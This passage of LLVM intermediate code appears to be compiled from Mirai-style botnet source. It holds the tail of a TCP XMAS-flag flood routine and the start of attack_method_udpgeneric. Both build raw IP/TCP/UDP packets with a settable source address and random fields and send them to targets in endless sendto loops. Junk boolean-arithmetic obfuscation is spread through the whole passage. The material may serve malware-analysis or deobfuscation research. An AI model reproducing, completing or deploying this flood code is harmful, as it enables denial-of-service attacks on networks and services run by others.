  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 4
  %480 = load i16, i16* %479, align 4
  %481 = xor i16 -4097, -1
  %482 = xor i16 %480, %481
  %483 = and i16 %482, %480
  %484 = and i16 %480, -4097
  %485 = xor i16 %483, -1
  %486 = xor i16 4096, -1
  %487 = xor i16 15899, -1
  %488 = and i16 %485, 15899
  %489 = and i16 %483, %487
  %490 = and i16 %486, 15899
  %491 = and i16 4096, %487
  %492 = or i16 %488, %489
  %493 = or i16 %490, %491
  %494 = xor i16 %492, %493
  %495 = or i16 %485, %486
  %496 = xor i16 %495, -1
  %497 = or i16 15899, %487
  %498 = and i16 %496, %497
  %499 = or i16 %494, %498
  %500 = or i16 %483, 4096
  store i16 %499, i16* %479, align 4
  %501 = call i32 @rand_next()
  %502 = xor i32 65535, -1
  %503 = xor i32 %501, %502
  %504 = and i32 %503, %501
  %505 = and i32 %501, 65535
  %506 = trunc i32 %504 to i16
  %507 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 5
  store i16 %506, i16* %508, align 2
  %509 = load i8, i8* %18, align 1
  %510 = sext i8 %509 to i16
  %511 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %512 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %511, i32 0, i32 4
  %513 = load i16, i16* %512, align 4
  %514 = xor i16 %510, -1
  %515 = xor i16 1, -1
  %516 = xor i16 -11309, -1
  %517 = or i16 %514, %515
  %518 = or i16 -11309, %516
  %519 = xor i16 %517, -1
  %520 = and i16 %519, %518
  %521 = and i16 %510, 1
  %522 = shl i16 %520, 13
  %523 = xor i16 %513, -1
  %524 = xor i16 -8193, -1
  %525 = xor i16 22692, -1
  %526 = or i16 %523, %524
  %527 = or i16 22692, %525
  %528 = xor i16 %526, -1
  %529 = and i16 %528, %527
  %530 = and i16 %513, -8193
  %531 = and i16 %529, %522
  %532 = xor i16 %529, %522
  %533 = or i16 %531, %532
  %534 = or i16 %529, %522
  store i16 %533, i16* %512, align 4
  %535 = load i8, i8* %19, align 1
  %536 = sext i8 %535 to i16
  %537 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 4
  %539 = load i16, i16* %538, align 4
  %540 = xor i16 1, -1
  %541 = xor i16 %536, %540
  %542 = and i16 %541, %536
  %543 = and i16 %536, 1
  %544 = shl i16 %542, 12
  %545 = xor i16 -4097, -1
  %546 = xor i16 %539, %545
  %547 = and i16 %546, %539
  %548 = and i16 %539, -4097
  %549 = xor i16 %547, -1
  %550 = xor i16 %544, -1
  %551 = xor i16 4580, -1
  %552 = and i16 %549, 4580
  %553 = and i16 %547, %551
  %554 = and i16 %550, 4580
  %555 = and i16 %544, %551
  %556 = or i16 %552, %553
  %557 = or i16 %554, %555
  %558 = xor i16 %556, %557
  %559 = or i16 %549, %550
  %560 = xor i16 %559, -1
  %561 = or i16 4580, %551
  %562 = and i16 %560, %561
  %563 = or i16 %558, %562
  %564 = or i16 %547, %544
  store i16 %563, i16* %538, align 4
  %565 = load i8, i8* %20, align 1
  %566 = sext i8 %565 to i16
  %567 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %568 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %567, i32 0, i32 4
  %569 = load i16, i16* %568, align 4
  %570 = xor i16 1, -1
  %571 = xor i16 %566, %570
  %572 = and i16 %571, %566
  %573 = and i16 %566, 1
  %574 = shl i16 %572, 11
  %575 = xor i16 -2049, -1
  %576 = xor i16 %569, %575
  %577 = and i16 %576, %569
  %578 = and i16 %569, -2049
  %579 = xor i16 %577, -1
  %580 = xor i16 %574, -1
  %581 = xor i16 18505, -1
  %582 = and i16 %579, 18505
  %583 = and i16 %577, %581
  %584 = and i16 %580, 18505
  %585 = and i16 %574, %581
  %586 = or i16 %582, %583
  %587 = or i16 %584, %585
  %588 = xor i16 %586, %587
  %589 = or i16 %579, %580
  %590 = xor i16 %589, -1
  %591 = or i16 18505, %581
  %592 = and i16 %590, %591
  %593 = or i16 %588, %592
  %594 = or i16 %577, %574
  store i16 %593, i16* %568, align 4
  %595 = load i8, i8* %21, align 1
  %596 = sext i8 %595 to i16
  %597 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 4
  %599 = load i16, i16* %598, align 4
  %600 = xor i16 1, -1
  %601 = xor i16 %596, %600
  %602 = and i16 %601, %596
  %603 = and i16 %596, 1
  %604 = shl i16 %602, 10
  %605 = xor i16 -1025, -1
  %606 = xor i16 %599, %605
  %607 = and i16 %606, %599
  %608 = and i16 %599, -1025
  %609 = and i16 %607, %604
  %610 = xor i16 %607, %604
  %611 = or i16 %609, %610
  %612 = or i16 %607, %604
  store i16 %611, i16* %598, align 4
  %613 = load i8, i8* %22, align 1
  %614 = sext i8 %613 to i16
  %615 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %616 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %615, i32 0, i32 4
  %617 = load i16, i16* %616, align 4
  %618 = xor i16 %614, -1
  %619 = xor i16 1, -1
  %620 = xor i16 29674, -1
  %621 = or i16 %618, %619
  %622 = or i16 29674, %620
  %623 = xor i16 %621, -1
  %624 = and i16 %623, %622
  %625 = and i16 %614, 1
  %626 = shl i16 %624, 9
  %627 = xor i16 %617, -1
  %628 = xor i16 -513, -1
  %629 = xor i16 11725, -1
  %630 = or i16 %627, %628
  %631 = or i16 11725, %629
  %632 = xor i16 %630, -1
  %633 = and i16 %632, %631
  %634 = and i16 %617, -513
  %635 = xor i16 %633, -1
  %636 = xor i16 %626, -1
  %637 = xor i16 134, -1
  %638 = and i16 %635, 134
  %639 = and i16 %633, %637
  %640 = and i16 %636, 134
  %641 = and i16 %626, %637
  %642 = or i16 %638, %639
  %643 = or i16 %640, %641
  %644 = xor i16 %642, %643
  %645 = or i16 %635, %636
  %646 = xor i16 %645, -1
  %647 = or i16 134, %637
  %648 = and i16 %646, %647
  %649 = or i16 %644, %648
  %650 = or i16 %633, %626
  store i16 %649, i16* %616, align 4
  %651 = load i8, i8* %23, align 1
  %652 = sext i8 %651 to i16
  %653 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %654 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %653, i32 0, i32 4
  %655 = load i16, i16* %654, align 4
  %656 = xor i16 %652, -1
  %657 = xor i16 1, -1
  %658 = xor i16 -7619, -1
  %659 = or i16 %656, %657
  %660 = or i16 -7619, %658
  %661 = xor i16 %659, -1
  %662 = and i16 %661, %660
  %663 = and i16 %652, 1
  %664 = shl i16 %662, 8
  %665 = xor i16 %655, -1
  %666 = xor i16 -257, -1
  %667 = xor i16 -12284, -1
  %668 = or i16 %665, %666
  %669 = or i16 -12284, %667
  %670 = xor i16 %668, -1
  %671 = and i16 %670, %669
  %672 = and i16 %655, -257
  %673 = and i16 %671, %664
  %674 = xor i16 %671, %664
  %675 = or i16 %673, %674
  %676 = or i16 %671, %664
  store i16 %675, i16* %654, align 4
  %677 = load i8*, i8** %38, align 8
  %678 = load i32, i32* %24, align 4
  call void @rand_str(i8* %677, i32 %678)
  br label %723

; <label>:679:                                    ; preds = %255, %240
  %680 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %680, i32 0, i32 4
  %682 = load i16, i16* %681, align 4
  %683 = lshr i16 %682, 8
  %684 = xor i16 %683, -1
  %685 = xor i16 1, -1
  %686 = xor i16 -12875, -1
  %687 = or i16 %684, %685
  %688 = or i16 -12875, %686
  %689 = xor i16 %687, -1
  %690 = and i16 %689, %688
  %691 = and i16 %683, 1
  %692 = zext i16 %690 to i32
  %693 = icmp ne i32 %692, 0
  br i1 %693, label %705, label %694

; <label>:694:                                    ; preds = %679
  %695 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %696 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %695, i32 0, i32 4
  %697 = load i16, i16* %696, align 4
  %698 = lshr i16 %697, 10
  %699 = xor i16 1, -1
  %700 = xor i16 %698, %699
  %701 = and i16 %700, %698
  %702 = and i16 %698, 1
  %703 = zext i16 %701 to i32
  %704 = icmp ne i32 %703, 0
  br i1 %704, label %705, label %708

; <label>:705:                                    ; preds = %694, %679
  %706 = load i32, i32* %26, align 4
  %707 = call i32 @close(i32 %706)
  br label %121

; <label>:708:                                    ; preds = %694
  br label %709

; <label>:709:                                    ; preds = %708
  br label %710

; <label>:710:                                    ; preds = %709, %228
  br label %711

; <label>:711:                                    ; preds = %710, %224, %216
  %712 = call i64 @time(i64* null) #7
  %713 = load i64, i64* %31, align 8
  %714 = sub i64 %712, 2232416331939622289
  %715 = sub i64 %714, %713
  %716 = add i64 %715, 2232416331939622289
  %717 = sub nsw i64 %712, %713
  %718 = icmp sgt i64 %716, 10
  br i1 %718, label %719, label %722

; <label>:719:                                    ; preds = %711
  %720 = load i32, i32* %26, align 4
  %721 = call i32 @close(i32 %720)
  br label %121

; <label>:722:                                    ; preds = %711
  br label %204

; <label>:723:                                    ; preds = %394
  br label %724

; <label>:724:                                    ; preds = %723, %124
  %725 = load i32, i32* %9, align 4
  %726 = sub i32 0, %725
  %727 = sub i32 0, 1
  %728 = add i32 %726, %727
  %729 = sub i32 0, %728
  %730 = add nsw i32 %725, 1
  store i32 %729, i32* %9, align 4
  br label %115

; <label>:731:                                    ; preds = %115
  br label %732

; <label>:732:                                    ; preds = %861, %731
  store i32 0, i32* %9, align 4
  br label %733

; <label>:733:                                    ; preds = %854, %732
  %734 = load i32, i32* %9, align 4
  %735 = load i8, i8* %5, align 1
  %736 = zext i8 %735 to i32
  %737 = icmp slt i32 %734, %736
  br i1 %737, label %738, label %861

; <label>:738:                                    ; preds = %733
  %739 = load i8**, i8*** %12, align 8
  %740 = load i32, i32* %9, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds i8*, i8** %739, i64 %741
  %743 = load i8*, i8** %742, align 8
  store i8* %743, i8** %39, align 8
  %744 = load i8*, i8** %39, align 8
  %745 = bitcast i8* %744 to %struct.iphdr*
  store %struct.iphdr* %745, %struct.iphdr** %40, align 8
  %746 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %747 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %746, i64 1
  %748 = bitcast %struct.iphdr* %747 to %struct.tcphdr*
  store %struct.tcphdr* %748, %struct.tcphdr** %41, align 8
  %749 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %750 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %749, i64 1
  %751 = bitcast %struct.tcphdr* %750 to i8*
  store i8* %751, i8** %42, align 8
  %752 = load i16, i16* %14, align 2
  %753 = zext i16 %752 to i32
  %754 = icmp eq i32 %753, 65535
  br i1 %754, label %755, label %764

; <label>:755:                                    ; preds = %738
  %756 = call i32 @rand_next()
  %757 = xor i32 65535, -1
  %758 = xor i32 %756, %757
  %759 = and i32 %758, %756
  %760 = and i32 %756, 65535
  %761 = trunc i32 %759 to i16
  %762 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %763 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %762, i32 0, i32 3
  store i16 %761, i16* %763, align 4
  br label %764

; <label>:764:                                    ; preds = %755, %738
  %765 = load i8, i8* %25, align 1
  %766 = icmp ne i8 %765, 0
  br i1 %766, label %767, label %770

; <label>:767:                                    ; preds = %764
  %768 = load i8*, i8** %42, align 8
  %769 = load i32, i32* %24, align 4
  call void @rand_str(i8* %768, i32 %769)
  br label %770

; <label>:770:                                    ; preds = %767, %764
  %771 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %772 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %771, i32 0, i32 7
  store i16 0, i16* %772, align 2
  %773 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %774 = bitcast %struct.iphdr* %773 to i16*
  %775 = call zeroext i16 @checksum_generic(i16* %774, i32 20)
  %776 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %777 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %776, i32 0, i32 7
  store i16 %775, i16* %777, align 2
  %778 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %779 = load i32, i32* %9, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %778, i64 %780
  %782 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %781, i32 0, i32 1
  %783 = load i32, i32* %782, align 4
  %784 = sub i32 %783, -942168979
  %785 = add i32 %784, 1
  %786 = add i32 %785, -942168979
  %787 = add i32 %783, 1
  store i32 %786, i32* %782, align 4
  %788 = trunc i32 %783 to i16
  %789 = call zeroext i16 @htons(i16 zeroext %788) #8
  %790 = zext i16 %789 to i32
  %791 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %792 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %791, i32 0, i32 2
  store i32 %790, i32* %792, align 4
  %793 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %794 = load i32, i32* %9, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %793, i64 %795
  %797 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %796, i32 0, i32 2
  %798 = load i32, i32* %797, align 4
  %799 = trunc i32 %798 to i16
  %800 = call zeroext i16 @htons(i16 zeroext %799) #8
  %801 = zext i16 %800 to i32
  %802 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 3
  store i32 %801, i32* %803, align 4
  %804 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %805 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %804, i32 0, i32 6
  store i16 0, i16* %805, align 4
  %806 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %807 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %808 = bitcast %struct.tcphdr* %807 to i8*
  %809 = load i32, i32* %24, align 4
  %810 = sext i32 %809 to i64
  %811 = sub i64 0, 20
  %812 = sub i64 0, %810
  %813 = add i64 %811, %812
  %814 = sub i64 0, %813
  %815 = add i64 20, %810
  %816 = trunc i64 %814 to i16
  %817 = call zeroext i16 @htons(i16 zeroext %816) #8
  %818 = load i32, i32* %24, align 4
  %819 = sext i32 %818 to i64
  %820 = add i64 20, 1091725764955078477
  %821 = add i64 %820, %819
  %822 = sub i64 %821, 1091725764955078477
  %823 = add i64 20, %819
  %824 = trunc i64 %822 to i32
  %825 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %806, i8* %808, i16 zeroext %817, i32 %824)
  %826 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %827 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %826, i32 0, i32 6
  store i16 %825, i16* %827, align 4
  %828 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %829 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %828, i32 0, i32 1
  %830 = load i16, i16* %829, align 2
  %831 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %832 = load i32, i32* %9, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %831, i64 %833
  %835 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %834, i32 0, i32 0
  %836 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %835, i32 0, i32 1
  store i16 %830, i16* %836, align 2
  %837 = load i32, i32* %10, align 4
  %838 = load i8*, i8** %39, align 8
  %839 = load i32, i32* %24, align 4
  %840 = sext i32 %839 to i64
  %841 = sub i64 0, %840
  %842 = sub i64 40, %841
  %843 = add i64 40, %840
  %844 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %845 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %846 = load i32, i32* %9, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %845, i64 %847
  %849 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %848, i32 0, i32 0
  %850 = bitcast %struct.sockaddr_in* %849 to %struct.sockaddr*
  store %struct.sockaddr* %850, %struct.sockaddr** %844, align 8
  %851 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %852 = load %struct.sockaddr*, %struct.sockaddr** %851, align 8
  %853 = call i64 @sendto(i32 %837, i8* %838, i64 %842, i32 16384, %struct.sockaddr* %852, i32 16)
  br label %854

; <label>:854:                                    ; preds = %770
  %855 = load i32, i32* %9, align 4
  %856 = sub i32 0, %855
  %857 = sub i32 0, 1
  %858 = add i32 %856, %857
  %859 = sub i32 0, %858
  %860 = add nsw i32 %855, 1
  store i32 %859, i32* %9, align 4
  br label %733

; <label>:861:                                    ; preds = %733
  br label %732

; <label>:862:                                    ; preds = %215, %111, %105
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #7
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #7
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %359

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #7
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %359

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %201, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %206

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #7
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 %107, -1
  %109 = xor i8 15, -1
  %110 = xor i8 119, -1
  %111 = or i8 %108, %109
  %112 = or i8 119, %110
  %113 = xor i8 %111, -1
  %114 = and i8 %113, %112
  %115 = and i8 %107, 15
  %116 = and i8 %114, 64
  %117 = xor i8 %114, 64
  %118 = or i8 %116, %117
  %119 = or i8 %114, 64
  store i8 %118, i8* %106, align 4
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = bitcast %struct.iphdr* %120 to i8*
  %122 = load i8, i8* %121, align 4
  %123 = xor i8 -16, -1
  %124 = xor i8 %122, %123
  %125 = and i8 %124, %122
  %126 = and i8 %122, -16
  %127 = xor i8 %125, -1
  %128 = xor i8 5, -1
  %129 = xor i8 -33, -1
  %130 = and i8 %127, -33
  %131 = and i8 %125, %129
  %132 = and i8 %128, -33
  %133 = and i8 5, %129
  %134 = or i8 %130, %131
  %135 = or i8 %132, %133
  %136 = xor i8 %134, %135
  %137 = or i8 %127, %128
  %138 = xor i8 %137, -1
  %139 = or i8 -33, %129
  %140 = and i8 %138, %139
  %141 = or i8 %136, %140
  %142 = or i8 %125, 5
  store i8 %141, i8* %121, align 4
  %143 = load i8, i8* %12, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i16, i16* %18, align 2
  %147 = zext i16 %146 to i64
  %148 = add i64 28, 4860760697182910978
  %149 = add i64 %148, %147
  %150 = sub i64 %149, 4860760697182910978
  %151 = add i64 28, %147
  %152 = trunc i64 %150 to i16
  %153 = call zeroext i16 @htons(i16 zeroext %152) #8
  %154 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 2
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %13, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %156) #8
  %158 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 3
  store i16 %157, i16* %159, align 4
  %160 = load i8, i8* %14, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 5
  store i8 %160, i8* %162, align 4
  %163 = load i8, i8* %15, align 1
  %164 = icmp ne i8 %163, 0
  br i1 %164, label %165, label %169

; <label>:165:                                    ; preds = %90
  %166 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %167 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 4
  store i16 %166, i16* %168, align 2
  br label %169

; <label>:169:                                    ; preds = %165, %90
  %170 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 6
  store i8 17, i8* %171, align 1
  %172 = load i32, i32* %20, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 8
  store i32 %172, i32* %174, align 4
  %175 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %176 = load i32, i32* %9, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i64 %177
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i32 0, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 9
  store i32 %180, i32* %182, align 4
  %183 = load i16, i16* %16, align 2
  %184 = call zeroext i16 @htons(i16 zeroext %183) #8
  %185 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %186 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %185, i32 0, i32 0
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %17, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #8
  %189 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %18, align 2
  %192 = zext i16 %191 to i64
  %193 = add i64 8, -8100843206291397701
  %194 = add i64 %193, %192
  %195 = sub i64 %194, -8100843206291397701
  %196 = add i64 8, %192
  %197 = trunc i64 %195 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #8
  %199 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  br label %201

; <label>:201:                                    ; preds = %169
  %202 = load i32, i32* %9, align 4
  %203 = sub i32 0, 1
  %204 = sub i32 %202, %203
  %205 = add nsw i32 %202, 1
  store i32 %204, i32* %9, align 4
  br label %85

; <label>:206:                                    ; preds = %85
  br label %207

; <label>:207:                                    ; preds = %358, %206
  store i32 0, i32* %9, align 4
  br label %208

; <label>:208:                                    ; preds = %352, %207
  %209 = load i32, i32* %9, align 4
  %210 = load i8, i8* %5, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp slt i32 %209, %211
  br i1 %212, label %213, label %358

; <label>:213:                                    ; preds = %208
  %214 = load i8**, i8*** %11, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i8*, i8** %214, i64 %216
  %218 = load i8*, i8** %217, align 8
  store i8* %218, i8** %23, align 8
  %219 = load i8*, i8** %23, align 8
  %220 = bitcast i8* %219 to %struct.iphdr*
  store %struct.iphdr* %220, %struct.iphdr** %24, align 8
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i64 1
  %223 = bitcast %struct.iphdr* %222 to %struct.udphdr*
